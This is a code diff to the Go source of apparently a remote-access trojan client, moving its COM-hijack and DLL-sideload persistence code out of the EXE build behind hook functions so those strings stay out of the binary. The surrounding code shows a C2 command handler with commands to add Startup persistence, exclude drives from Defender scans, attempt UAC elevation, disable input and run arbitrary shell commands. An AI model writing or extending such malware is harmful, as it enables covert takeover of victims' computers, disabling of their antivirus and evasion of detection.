@@ -1624,6 +1624,12 @@ func getFolderTree() string {
 // PERSISTENCE
 // ================================================================
 
+// Hooks set by DLL build (dll_sideload.go init) — nil in EXE build.
+// Keeps all DLL/COM-specific strings out of the EXE binary.
+var extraPersistCleanup func()
+var extraOptionsText func() string
+var extraCommandHandler func(cmd string) (result string, handled bool)
+
 func addPersistence() string {
 	exePath, err := os.Executable()
 	if err != nil {
@@ -1654,14 +1660,11 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
-	// Clean up DLL sideload + COM hijack if present
-	comCLSID := `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
-	comRegKey := `Software\Classes\CLSID\` + comCLSID + `\InprocServer32`
-	regDelete(HKCU, comRegKey, "")
-	regDelete(HKCU, comRegKey, "ThreadingModel")
-	sideloadDLL := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Shell\ShellServiceHost.dll`)
-	os.Remove(sideloadDLL)
-	return "Persistence removed (startup + COM hijack + sideload)"
+	// DLL build sets this hook to clean up COM hijack + sideloaded DLL
+	if extraPersistCleanup != nil {
+		extraPersistCleanup()
+	}
+	return "Persistence removed"
 }
 
 // ================================================================
@@ -1979,16 +1982,14 @@ func decryptData(ciphertext, key []byte) ([]byte, error) {
 // ================================================================
 
 func optionsText() string {
-	return `=== MACHINE MANAGEMENT - COMMANDS ===
+	base := `=== MACHINE MANAGEMENT - COMMANDS ===
 
 SYSTEM
   sysinfo        - Full system information report
   isadmin        - Check if session is admin
   elevate        - Attempt UAC elevation
   persist        - Add persistence (Startup folder VBS stager)
-  unpersist      - Remove persistence (startup + sideload)
-  sideload       - Install COM hijack + DLL sideload (explorer.exe)
-  unsideload     - Remove COM hijack + sideloaded DLL
+  unpersist      - Remove all persistence
   excludec       - Exclude C:\ from Defender scans
   excludeall     - Exclude C:\ through G:\ from Defender
   enableio       - Enable keyboard/mouse (admin)
@@ -2040,6 +2041,10 @@ CONTROL
   ping           - Connection test
   sleep          - Sleep N seconds (args: seconds)
   exit           - Terminate client`
+	if extraOptionsText != nil {
+		return base + "\n" + extraOptionsText()
+	}
+	return base
 }
 
 // ================================================================
@@ -2079,12 +2084,6 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 
 	case "unpersist", "removepersistance":
 		result = removePersistence()
-
-	case "sideload":
-		result = installSideload()
-
-	case "unsideload":
-		result = uninstallSideload()
 
 	case "excludec", "excludecdrive":
 		result = excludeDrive([]string{`C:\`})
@@ -2311,6 +2310,13 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		os.Exit(0)
 
 	default:
+		// DLL build injects extra commands (sideload, unsideload, etc.)
+		if extraCommandHandler != nil {
+			if r, handled := extraCommandHandler(cmd.Command); handled {
+				result = r
+				break
+			}
+		}
 		// Try executing as raw shell command
 		out, err := shellExec(cmd.Command + " " + cmd.Args)
 		if err != nil {
